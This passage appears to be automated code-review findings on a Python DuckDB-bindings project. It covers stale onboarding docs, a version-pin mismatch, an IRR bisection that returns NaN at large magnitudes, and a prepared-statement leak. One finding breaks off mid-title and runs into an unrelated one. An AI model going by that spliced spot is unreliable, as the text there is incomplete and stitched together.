'_duckdb_bind_hugeint/_uhugeint/_interval' intrinsics at 'ducklib.py:1525-1640 (~116 lines)' to _call_lib_func — that migration is already done (the binds are now @proxy wrappers at ducklib.py:1411-1432) and the cited line range does not even exist (the file is 1432 lines). The INT/INT eightbyte repack referenced as a 'gated numbox follow-up' already lives in numbox call.py/abi.py.
confirmed.impact: A maintainer following the documented 'Adding a New Binding' recipe writes @cres(...) (nonexistent decorator, missing jit_options) producing code that does not match the module; searches for four helper functions that do not exist; and may re-attempt a completed 116-line migration against phantom line numbers. The single authoritative onboarding doc for this ~190-wrapper module actively misdescribes it.
confirmed.recommendation: Rewrite the Architecture (L26), 'Adding a New Binding' template (L33-37), 'Struct-by-value helpers' (L43-53), 'Follow-ups' (L55-62), and 'Related Projects' (L86) sections to reflect the current @proxy/@proxy_if_available + _call_lib_func/_call_lib_func_byval design: no local intrinsics, ABI lowering (byval/optnone/sret/INT-INT repack) lives entirely in numbox, and the struct-by-value migration is complete. Delete the stale Follow-ups item.
confirmed.verdictReasoning: All concrete claims verify against the current tree. ducklib.py:1-9 imports @proxy/@proxy_if_available from numbox.core.proxy.proxy and _call_lib_func/_call_lib_func_byval from numbox.core.bindings.call; grep over ducklib.py for '@cres', '@intrinsic', '_call_lib_func_struct_in', '_call_lib_func_struct_out', '_emit_byval_call', and '_build_packed_interval' returns zero hits -- the file defines no local helpers or intrinsics at all (numbox.utils.highlevel.cres is a real decorator elsewhere in numbox but is used nowhere in numbduck). CLAUDE.md:26 and the 'Adding a New Binding' template at CLAUDE.md:33-37 both show '@cres(signatures.get(...))' with no jit_options kwarg, and CLAUDE.md:86 again names the '@cres decorator' -- none of this matches the actual pattern used by every one of the ~190 wrappers, spot-checked at ducklib.py:1411-1432 (duckdb_bind_hugeint/uhugeint/interval/decimal) and ducklib.py:648-663 (duckdb_create_decimal/hugeint/interval): all are plain '@proxy(signatures.get(...), jit_options=jit_options)' + _call_lib_func. CLAUDE.md:43-53 'Struct-by-value helpers' describes four ducklib.py-local helpers plus custom @intrinsic functions for decimal/varint/interval, none of which exist in the file. CLAUDE.md:55-62 Follow-ups cites a pending migration of hand-rolled hugeint/uhugeint/interval intrinsics at 'ducklib.py:1525-1640 (~116 lines)', but wc -l gives 1432 total lines (the cited range is past EOF) and those exact three binds are already @proxy wrappers at ducklib.py:1411-1426, so the migration is already complete and the citation is unfollowable. Nothing found refutes any of these claims. Severity: real and correctly characterized as stale documentation that will actively misdirect a contributor (wrong decorator, missing jit_options, references to dead helpers/phantom line ranges), consistent with the prior 2026-06-29 review's assessment of the same doc-staleness pattern. Corrected to medium: this is confined to CLAUDE.md (a non-code onboarding doc) with no runtime, correctness, or test impact on numbduck itself, so 'high' overstates the blast radius relative to a functional/correctness defect.

confirmed.title: CLAUDE.md numbox pin (~=0.5.6) contradicts pyproject (>=0.5.13)
confirmed.description: CLAUDE.md 'Key dependencies' states `numbox~=0.5.6`, but pyproject.toml:13 pins `numbox>=0.5.13`. `~=0.5.6` means `>=0.5.6,<0.6` which is not even the same operator family, and the floor is 7 patch releases stale. The current @proxy tree depends on numbox APIs (proxy/proxy_if_available, the generic INT/INT eightbyte repack in call.py/abi.py) that only exist in newer numbox; 0.5.6 would not satisfy the code. The doc's stated minimum is simply wrong.
confirmed.impact: A contributor trusting CLAUDE.md could install/pin numbox 0.5.6 and hit import-time failures (missing proxy/repack machinery). The single source-of-truth pin lives in pyproject; the doc silently disagrees.
confirmed.recommendation: Change line 16 to `numbox>=0.5.13` (match pyproject.toml:13), or drop the explicit version from CLAUDE.md and point to pyproject as the source of truth.
confirmed.verdictReasoning: Verified against current tree: numbduck/CLAUDE.md:16 reads 'Key dependencies: `duckdb>=1.3.2,<1.6`, `numbox~=0.5.6`' while numbduck/pyproject.toml:13 pins `numbox>=0.5.13`. The two specifiers are genuinely inconsistent (`~=0.5.6` caps at <0.6, and its floor is well below the pyproject floor), so the core factual claim is correct and directly confirmed by reading both files. Severity: the finding's 'high' rating leans on 'a contributor trusting CLAUDE.md could install/pin numbox 0.5.6 and hit import-time failures' -- but pyproject.toml is the actual installed/enforced dependency spec (pip/uv/poetry read pyproject, not CLAUDE.md), so no real install can silently land on 0.5.6; CLAUDE.md is descriptive prose, not a machine-enforced constraint. The practical risk is a misleading doc (a human reader misjudging the minimum numbox version), not a build/runtime break. That is a real but lower-severity documentation defect -- corrected to medium.

confirmed.title: CLAUDE.md 'Follow-ups' cites nonexistent ducklib.py line range 1525-1640 and an already-completed migration
confirmed.description: The Follow-ups item (lines 57-62) says to 'Migrate `_duckdb_bind_hugeint`/`_uhugeint`/`_interval` ... Three hand-rolled intrinsics at `ducklib.py:1525-1640` (~116 lines)' and references sibling wrappers at `ducklib.py:298-433`. ducklib.py is 1432 lines total, so lines 1525-1640 do not exist. Moreover the migration described as pending is already done: `duckdb_bind_hugeint` (ducklib.py:1411), `duckdb_bind_uhugeint` (1417), and `duckdb_bind_interval` (1423) are already plain `@proxy` + `_call_lib_func` wrappers with no bespoke intrinsics; the interval INT/INT repack the follow-up gates on ('once the numbox repack lands') already lives in numbox call.py. The entire follow-up is complete/obsolete.
confirmed.impact: The doc directs a maintainer to line ranges past EOF and to perform work that is already merged, wasting effort and eroding trust in the doc's line references.
confirmed.recommendation: Delete the Follow-ups item (the migration is done), or rewrite it to reflect that hugeint/uhugeint/interval binds are now @proxy wrappers at ducklib.py:1411-1432 and the numbox repack has landed.
confirmed.verdictReasoning: Independently verified against the current tree. numbduck/numbduck/ducklib.py is exactly 1432 lines total (wc -l), so the CLAUDE.md Follow-ups line range 'ducklib.py:1525-1640' (CLAUDE.md:57) references lines past EOF -- it cannot exist. Grepping ducklib.py for @intrinsic, _build_packed_interval, _call_lib_func_struct_in/_out, and _emit_byval_call returns zero hits anywhere in the file, confirming no 'hand-rolled intrinsics' remain. The three binds named in the follow-up are present at ducklib.py:1411-1426 as plain @proxy(...)+_call_lib_func(...) wrappers (duckdb_bind_hugeint at 1411-1414, duckdb_bind_uhugeint at 1417-1420, duckdb_bind_interval at 1423-1426), matching the 18 sibling wrappers' pattern -- i.e. the described migration is already complete, not pending. Also verified the doc's stated precondition: numbox's /home/erik/projects/numbox/numbox/core/bindings/call.py already implements the generic INT/INT eightbyte repack via _needs_int_int_eightbyte_repack (line 212) and _repack_to_i64_pair (line 236), used inside _call_lib_func (lines 115, 160-161) -- so the 'once the numbox repack lands' gate the follow-up describes has, in fact, already landed. confirmed.title: Adding-a-New-Binding steps 1/7 tell you to verify docstring links against duckdb.h, contradicting step 5 and the actual docstrings
confirmed.description: Step 1 (line 30) says 'Verify all docstring links point to the correct line in `duckdb.h`' and step 7 (line 41) says 're-verify ... docstring links against `duckdb.h`'. confirmed.title: Bisection uses an absolute NPV tolerance only; returns NaN for large-magnitude cashflows even after full convergence
confirmed.description: irr_bisect (lines 78-94) exits successfully ONLY when abs(npv) < 1e-9 (line 88). It has no bracket-width fallback: if the tolerance is not met within the 100 iterations, it returns math.nan (line 94). The residual NPV that is achievable at the best representable double near the true root is on the order of |dNPV/dr| * ulp(r), and |dNPV/dr| scales linearly with the cashflow magnitude. For large-magnitude cashflows the achievable residual floor exceeds the fixed 1e-9 absolute tolerance, so the loop can never satisfy abs(npv) < 1e-9 no matter how tightly r converges, and the function returns NaN despite r_mid having already resolved to the true root to machine precision. I reproduced this by simulating the exact algorithm on the Test-3 sparse case (single cashflow at period 12): at the tested scale (investment 10,000 / cashflow 13,000) it returns the correct 0.022104, but scaling all amounts by 1,000 (investment 10,000,000 / cashflow 13,000,000) already returns NaN, and every larger scale (1e6, 1e8, 1e9) also returns NaN. The correct IRR is identical (0.022104) at every scale since it is scale-invariant, so this is a pure convergence-criterion defect, not a real change in the answer.
confirmed.impact: Any GROUP BY key whose cashflow magnitudes reach the ~10-million range (routine for portfolio/enterprise financial data) silently produces NaN instead of the correct IRR. The example's own three tests all use small amounts (<=10,000) and so pass, masking the bug; a user copying this UDAF onto realistic data gets wrong (NaN) results with no error.
confirmed.recommendation: Add a bracket-width convergence exit so the solver returns the converged rate regardless of residual scale, e.g. after computing r_mid, return r_mid when (r_hi - r_lo) < 1e-12 (or return the final r_mid after the loop instead of NaN). Alternatively make the tolerance relative to the NPV scale (e.g. abs(npv) < 1e-9 * max(1.0, abs(investment) + abs(target_npv))). A bracket-width test is the standard robust choice for bisection and fixes the NaN-on-large-magnitude case without changing the small-magnitude results.
confirmed.verdictReasoning: Empirically reproduced against the exact algorithm at examples/irr.py:78-94. irr_bisect's ONLY successful-exit path is the fixed absolute tolerance `abs(npv) < 1e-9` at line 88; there is no bracket-width (r_hi - r_lo) fallback, so if that threshold is never met within the 100 iterations, line 94 returns math.nan unconditionally. Simulating the exact loop body (same r_lo=-0.99/r_hi=10.0 bracket, same bisection update, same npv accumulation) reproduces both the example's own Test 3 result and the failure: at the as-shipped scale (investment 10,000 / cashflow 13,000 at period 12) the loop converges at iteration 48 to r=0.0221044505936171, matching the analytic expected value 0.022104450593615876 to 1e-10 -- so the demo's asserts do pass as claimed. Scaling both investment and cashflow by 1000x to 10,000,000 / 13,000,000 (a routine enterprise-scale magnitude, still well within double precision) makes the loop run all 100 iterations without ever satisfying abs(npv) < 1e-9 and return math.nan, even though the true IRR is scale-invariant and identical (0.02210...). This confirms the residual-npv floor (which scales with cashflow magnitude via |dNPV/dr| * ulp(r)) exceeds the fixed 1e-9 tolerance at this scale, so a fully-converged bisection is misreported as non-convergent. The example ships no relative-tolerance or bracket-width exit anywhere else in the file, and none of the three built-in tests (max magnitude 10,000) exercise a scale large enough to expose it, so nothing else in the module masks or handles this. Severity: medium is appropriate -- this is example/demo code (not a core library binding), which limits blast radius, but it is a genuine silent-wrong-answer (NaN, no exception) correctness bug at a magnitude (~10 million) that is unremarkable for real financial data, i.e., exactly the kind of bug a user copying this reference pattern would likely hit.

confirmed.title: Prepared statement not destroyed on any error path (no try/finally)
confirmed.description: score_jit (lines 150-162) allocates a DuckDB prepared statement via duckdb_prepare (line 155) and only frees it with duckdb_destroy_prepare at line 161, on the straight-line happy path. There is no try/finally. Two leak paths exist. (a) The `assert rc == ducklib.DuckDBSuccess` at line 156 sits BETWEEN prepare and destroy; if prepare fails the assert raises and duckdb_destroy_prepare is never reached. Per duckdb.h, duckdb_prepare allocates a prepared-statement object that must be freed with duckdb_destroy_prepare EVEN WHEN THE PREPARE FAILS (that object is also where the error message lives) — so the assert-fail path leaks the statement. (b) If _score_jit_loop raises (e.g. a bounds error inside the nogil njit loop, or a NULL-chunk deref per EX-os-MEM-2), the exception propagates out of score_jit and line 161 is skipped, leaking the statement; additionally any in-flight chunk/result inside the loop iteration that raised is leaked because their destroy calls (lines 143-144) run only at the end of a completed iteration. The task focus explicitly calls for prepared-statement cleanup via try/finally, which the current code does not have.
confirmed.impact: On any prepare failure or exception in the JIT loop the prepared statement (and possibly one chunk + one result) leaks. In the parallel-scaling block score_jit is invoked once per worker per T (many times), so a recurring error would accumulate leaked DuckDB handles. As the canonical usage contract for prepared-statement execution, the missing try/finally teaches an unsafe pattern.
confirmed.recommendation: Wrap the body from just after create_duckdb_prepared_statement() through the loop in try/finally, calling duckdb_destroy_prepare(stmt.ctypes.data) in the finally. Move the destroy so it runs even when the assert or _score_jit_loop raises; keep the assert inside the try.
confirmed.verdictReasoning: Read examples/online_scoring.py:150-162 (score_jit) on the current tree: conn_ptr=extract_connection_ptr(conn); stmt=create_duckdb_prepared_statement(); rc=ducklib.duckdb_prepare(...) at line 155; assert rc == ducklib.DuckDBSuccess at line 156; _score_jit_loop(...) at line 160; ducklib.duckdb_destroy_prepare(stmt.ctypes.data) at line 161 only reached on the straight-line success path -- no try/finally anywhere in the function. duckdb.h (cached copy, lines 1573-1574, directly above the duckdb_prepare declaration) states verbatim: 'Note that after calling duckdb_prepare, the prepared statement should always be destroyed using duckdb_destroy_prepare, even if the prepare fails.' This confirms leak path (a): if duckdb_prepare fails, the assert raises AssertionError before line 161 runs, and per duckdb.h the prepared-statement object (which also owns the error message per duckdb_prepare_error's docs) is never freed. Leak path (b) is also real: if _score_jit_loop (an @njit(nogil=True) function) raises for any reason, the exception propagates past line 161, again skipping the destroy call. Checked numbduck/duckdb_utils.py:25-27 (create_duckdb_prepared_statement) -- it is a bare allocate_buffer(1) with no compensating cleanup registered elsewhere (no context manager, no atexit, no finally in any caller), so nothing else in the codebase closes this gap. Line numbers in the finding (150-162 range, prepare at 155, assert at 156, destroy at 161) match the current file exactly. The reviewer's characterization is accurate and not refuted by any contract-is-satisfied-elsewhere explanation. Severity: this is example/benchmark code, not a core library binding, and under the example's own fixed, valid SQL and always-populated features table, prepare essentially always succeeds in practice, which caps real-world blast radius. But score_jit is explicitly documented as 'the canonical prepared-execute reading pattern' and is invoked repeatedly (once per worker per T in run_scaling_block), so a reader copying this pattern into production code would reproduce a genuine, documented-in-duckdb.h resource leak on any prepare failure or loop exception. Medium is a reasonable, non-inflated severity for a clear, doc-confirmed resource-leak/error-path defect in reference/teaching code; no basis to downgrade to low or escalate to high given the low practical trigger probability in this specific script.
